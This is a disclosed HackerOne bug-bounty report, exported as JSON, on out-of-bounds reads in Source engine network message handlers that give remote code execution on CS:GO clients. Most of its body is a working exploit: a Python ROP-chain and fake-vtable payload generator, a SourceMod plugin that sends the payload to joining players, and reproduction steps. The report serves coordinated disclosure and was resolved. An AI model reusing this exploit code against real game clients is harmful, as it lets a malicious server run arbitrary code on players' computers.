{
  "id": 807772,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDc3NzI=",
  "url": "https://hackerone.com/reports/807772",
  "title": "OOB reads in network message handlers leads to RCE",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-02-29T17:19:45.863Z",
  "submitted_at": "2020-02-29T17:19:45.863Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "slidybat",
    "url": "/slidybat",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/321/945/c0b45757c343821a68011afe1b229344a41aa9dd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23363,
    "url": "https://hackerone.com/valve",
    "handle": "valve",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Valve",
      "twitter_handle": "",
      "website": "https://www.valvesoftware.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-05-04T00:25:22.781Z",
  "bug_reporter_agreed_on_going_public_at": "2021-05-01T01:50:09.748Z",
  "team_member_agreed_on_going_public_at": "2021-05-04T00:25:22.612Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Vulnerability\nIn Source engine games there are many network messages sent from the server to the client that take an entity index. There is a common pattern among many of these messages for the lower bounds of the entity index to be checked but not the upper bounds. In many cases these out of bound reads get an entity pointer from that index then call a virtual function on it.\n\nAs an example, here is the handler for the CS:GO [`GlowPropTurnOff`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L444-L446) message:\n\n```cpp\nbool _MsgFunc_GlowPropTurnOff(CCSUserMsg_GlowPropTurnOff* msg)\n{\n  CBaseEntity* entity = nullptr;\n\n  int ent_idx = msg->ent_index;\n  if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr )\n  {\n    CBaseHandle* handle = entitylist[ent_idx]\n    entity = handle->GetBaseEntity();  // A virtual function\n  }\n  \n  // ...\n  \n  return true;\n}\n```\n\n\n# Exploiting the vulnerability\nI will be discussing the `GlowPropTurnOff` message specifically for the remainder of this report, however this OOB read pattern exists in other messages too. I have successfully tested this on a couple of other CS:GO user messages, and while I haven't tested it I also suspect that this bug pattern exists in the network messages of other Source games as well.\n\nThis is the assembly used to access the `entitylist` array:\n```asm\nmov     eax, ent_idx\ntest    eax, eax\njs      short loc_103B77A2\nshl     eax, 4\nmov     ecx, entitylist[eax]\n```\n\nThe index is shifted left by 4 bits (`shl eax, 4`) before being used to access `entitylist`. This means that we can supply a large positive number that will overflow to a negative number, allowing us to return a pointer to pretty much anywhere in the module. Our goal will be to supply an index that returns a pointer to some memory that we control on the client. This memory will have the required vtable set up so that when `handle->GetBaseEntity()` is called it will call an address that we control.\n\nFollowing a writeup of a similar bug (https://insomnihack.ch/wp-content/uploads/2017/04/AC_remote_exploitation_of_valve_source.pdf), I chose to use the [`ShowMenu`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L417-L421) message to set up the needed memory on the client. The `ShowMenu` message takes the `menu_string` supplied from the server, converts it to UTF16, and stores it in a global string variable `wchar_t g_szMenuString[512]`.\n\nI wrote the following Python script to generate the payload needed to send through the `ShowMenu` message to set up a fake object with a valid vtable and also includes the ROP chain needed to pop calc:\n```py\nfrom pwn import *\nimport textwrap\n\nBASE_ADDRESS        = 0x287E0000\nFAKE_OBJ            = BASE_ADDRESS + 0x3174F3C\n\nSHELL_EXECUTE_ADDR  = BASE_ADDRESS + 0xA8F244\n\nGADGET_XCHG_EAX_ESP = BASE_ADDRESS + 0xA2AAD1\nGADGET_POP_ESP      = BASE_ADDRESS + 0x7E031C\nGADGET_POP_EAX      = BASE_ADDRESS + 0x4a925\nGADGET_POP_EDI      = BASE_ADDRESS + 0x2f00C6\nGADGET_MOV_EAX_EDI  = BASE_ADDRESS + 0x74215\nGADGET_MOV_EAX_EAX  = BASE_ADDRESS + 0x73c92\nGADGET_XOR_EAX_EAX  = BASE_ADDRESS + 0xb4279\nGADGET_XCHG_EAX_EDI = BASE_ADDRESS + 0x1da80f\n\ndef to_unicode(dword):\n    a = dword & 0xffff;\n    b = dword >> 16;\n    return eval('u\"\\\\u%s\\\\u%s\"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))\n\ndef write(addr, value):\n    rop = u''\n    rop += to_unicode(GADGET_POP_EAX)\n    rop += to_unicode(addr)\n    rop += to_unicode(GADGET_POP_EDI)\n    rop += to_unicode(value)\n    rop += to_unicode(GADGET_MOV_EAX_EDI)\n    return rop\n\ndef write_deref(addr, to_deref):\n    rop = u''\n    rop += to_unicode(GADGET_POP_EAX)\n    rop += to_unicode(to_deref)\n    rop += to_unicode(GADGET_MOV_EAX_EAX)\n    rop += to_unicode(GADGET_POP_EDI)\n    rop += to_unicode(addr)\n    rop += to_unicode(GADGET_XCHG_EAX_EDI)\n    rop += to_unicode(GADGET_MOV_EAX_EDI)\n    return rop\n\ndef write_zero(addr):\n    rop = u''\n    rop += to_unicode(GADGET_XOR_EAX_EAX)\n    rop += to_unicode(GADGET_POP_EDI)\n    rop += to_unicode(addr)\n    rop += to_unicode(GADGET_XCHG_EAX_EDI)\n    rop += to_unicode(GADGET_MOV_EAX_EDI)\n    return rop\n\ndef stack_pivot(addr):\n    rop = u''\n    rop += to_unicode(GADGET_POP_ESP)\n    rop += to_unicode(addr)\n    return rop\n\nrop = ''\n\nopen_str_addr = FAKE_OBJ + 400\nrop += write(open_str_addr, u32('open'))\n\ncalc_str_addr = FAKE_OBJ + 420\nrop += write(calc_str_addr, u32('calc'))\n\n# Move stack somewhere where it can safely not overwrite our fake object as functions are called\nparams_addr = FAKE_OBJ + 1000000\nrop += write_deref(params_addr, SHELL_EXECUTE_ADDR)\nrop += write(params_addr + 4, 0x41414141)\nrop += write_zero(params_addr + 8)\nrop += write(params_addr + 12, open_str_addr)\nrop += write(params_addr + 16, calc_str_addr)\nrop += write_zero(params_addr + 20)\nrop += write_zero(params_addr + 24)\nrop += write_zero(params_addr + 28)\nrop += stack_pivot(params_addr)\n\n# Fake object structure\n#  0 - pointer to actual object (#1)\n#  1 - pointer to vtable        (#2)\n#  2 - pointer to `pop esp`           <-- start of vtable, and where eax will be pointing once #9 is called\n#  3 - pointer to full stack    (#10) <-- This will move the stack to somewhere where we have more room \n#  4 - junk\n#  5 - junk\n#  6 - junk\n#  7 - junk\n#  8 - junk\n#  9 - ptr to `xchg eax, esp`         <-- address that is initially jumped to, will set esp to #2 so we can pivot stack & begin ROP chain\n# 10 - stack                          <-- where our ROP chain begins\nfakeobj = u''\nfakeobj += '--'\nfakeobj += to_unicode(FAKE_OBJ + 4)\nfakeobj += to_unicode(FAKE_OBJ + 4 * 2)\nfakeobj += to_unicode(GADGET_POP_ESP)\nfakeobj += to_unicode(FAKE_OBJ + 4 * 10)\nfakeobj += u'\\u4141\\u4141'\nfakeobj += u'\\u4242\\u4242'\nfakeobj += u'\\u4343\\u4343'\nfakeobj += u'\\u4444\\u4444'\nfakeobj += u'\\u4545\\u4545'\nfakeobj += to_unicode(GADGET_XCHG_EAX_ESP)\nfakeobj += rop\n\nfakeobj = fakeobj.encode('utf-8')\n\nprint(''.join(['\\\\x%02x' % ord(c) for c in fakeobj]))\n```\n\n*Note*: As in #470520 the script above needs to know the base address of the client's `client_panorama.dll` module in order to be 100% reliable, however it isn't possible to this due to ASLR.\n\nNext, this payload needs to be sent to the client. I did this using the following SourceMod plugin:\n```cpp\n#include <sdktools>\n\npublic void OnPluginStart()\n{\n\tHookEvent( \"player_spawn\", Event_PlayerSpawn );\n}\n\npublic Action Event_PlayerSpawn( Event event, const char[] name, bool dontBroadcast )\n{\n    int client = GetClientOfUserId( event.GetInt( \"userid\" ) );\n\t\n\t{\n\t\tchar payload[] = \"PLACE PAYLOAD HERE\";\n\t\n\t\tProtobuf msg = UserMessageToProtobuf( StartMessageOne( \"ShowMenu\", client ) );\n\t\tmsg.SetInt( \"bits_valid_slots\", 0xFFFFFFFF );\n\t\tmsg.SetInt( \"display_time\", 0 );\n\t\tmsg.SetString( \"menu_string\", payload );\n\t\tEndMessage();\n\t}\n\t\n\t{\n\t\tProtobuf msg = UserMessageToProtobuf( StartMessageOne( \"GlowPropTurnOff\", client ) );\n\t\tmsg.SetInt( \"entidx\", 0xfe43167 );\n\t\tEndMessage();\n\t}\n\n\treturn Plugin_Continue;\n}\n```\n\nOnce a client connects the payload is set up using the `ShowMenu` message and then is triggered immediately after with the `GlowPropTurnOff` message, resulting in calc being popped.\n\n\n# PoC\nHere is a video showcasing the bug being triggered on CS:GO when joining a server:\n{F732616}\n\n\n# Reproduction steps\n1) Start CS:GO and note the base address of `client_panorama.dll`\n2) Replace the value of `BASE_ADDRESS` in the Python script above with this base address value and run the script\n3) Copy the generated payload into the contents of the `payload` string in the SourceMod script above and compile the plugin\n4) Add the compiled plugin to the server and connect to this server with the client, as soon as the client is fully connected calc will be popped automatically\n\n## Impact\n\nThis bug allows an attacker to execute arbitrary code on the computers of any clients that join their server.",
  "bounty_amount": "7500.0",
  "formatted_bounty": "$7,500",
  "weakness": {
    "id": 8,
    "name": "Out-of-bounds Read"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 732616,
      "file_name": "OPWTVDox3r.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2z7yrhSobvFw8Fw1anNnyE19?response-content-disposition=attachment%3B%20filename%3D%22OPWTVDox3r.mp4%22%3B%20filename%2A%3DUTF-8%27%27OPWTVDox3r.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYXA2JSSL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T030416Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH4aCXVzLXdlc3QtMiJHMEUCIQC9JgjrvVUHLexbFFv1tEgfY61VXBaWjZG5Y1kCBeTTRwIgN4w9WZOIFqxTGgZtblXFHwLNndfRzCx7%2FtF990wpwqAquwUI9%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFQQKMJ34gpArjRt1yqPBfsavkZG4y0a4%2B%2B6zExz7sIfTEiWsrYLUFI%2B2rH%2FMqEC5JKgvwN34AGHEcsJ6FYUyKBDyQvrKwNlUx1Dv6e69ooLk9%2FMwiE22BIdReSXJuRdc56g5VV0%2B4RAAjWzaggh5VSlobr4TGZcr0VEAJBljJ9xv71OuyL4%2FJspexJlmcgTHUxdCQYBOnAacgW8c4FLQXZqhY%2BJE%2BnGI7EuKx6E%2F5k0JEXErJOsVu0LtxE4wNrOwhGWzV%2BIA7BAkZvD9dd655%2BFzwD0nID%2FN36wizb6FRNXOsX93t%2Fm0wyHunGcvNKYfYDumcaKrR6mWgQeCDll%2BMomNPzEU6WUVdw%2BGKnckwUQVkrHCCeNAkqeL6LI6WiixgaTnnRaDOKz78g5QbTAy4a2kaywzuDPi6QHuRLZj3calmuqJQsHUJoQGsjexurUfZFmj0C1zz0lcAO48Dk888Ke2DdpvqUxJiY48beUl3v5B%2BnA8MRoQHTNMbyykk%2FuGKeiyFN54LUX7Q9aZXTV9fCu1f7DQKASWyWyRFdh4jLvHjKpSKwgNGJ2RJN7UrTRWO4WFfHLdNtyd2HpmT6TKv8DdOGpepARtBExTdU0w%2FstYcBn5e8bOgzUy9ujlcXJzBmvVgncLf1wK2d1LpCURcjpvoETmc3jpEmrnGDCKOSAy51TQTGSlqCXXwNApBTB2F2g6dI2dFi0T4YT08nbH0NFt2NhbnxBWyQlfRpRuRxA00gmv68Y8fRcn4GfP2Ur83OwMCndv4YUWq9jrRjeeKgC0PWX5yLbw5nflu7UVQGVfR0Ct2MPqcXfxmETgsh8jtV92SNqz0URr5eEN%2F7pTkS8skAfG1lo%2F13vu0OHsjVncbEMZ5ICBvJjyrWbPNkwlci8xgY6sQG%2B8Sed1scznEQp2l1oRVJoEoysZ8Uqp8zg1M3o42tyMwi%2BhBVuG%2FXGy1juWBwLBOTkdns%2BN3JdhwQnI3%2B%2FR6eHLGUyPB5xgieePV4Rj3%2FJ33lTbVxkHrvkIPdi%2Bp8jfQZJuyKwz6kN5IR%2FlR6OFVtN2oUwkN00DbVY%2FTZSaZcu%2BFRFJwNsFITbZqHpWyLk40OOFMeXoemxRC2JZzw380gA7oh3tqKilPIQfcSPzDvqOoo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=959d277725ce44a20fc796ed45002d675575533eb79114b996cda54a13d7c4c6",
      "file_size": 2299263,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 212,
  "voters": [
    "pretorian",
    "taha",
    "superpan",
    "jackrogers0",
    "orange303",
    "brunopaixao",
    "kurogai",
    "mlucas",
    "d3mondev",
    "pmnh",
    "and 202 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 1290,
    "asset_type": "DOWNLOADABLE_EXECUTABLES",
    "asset_identifier": "*.exe",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
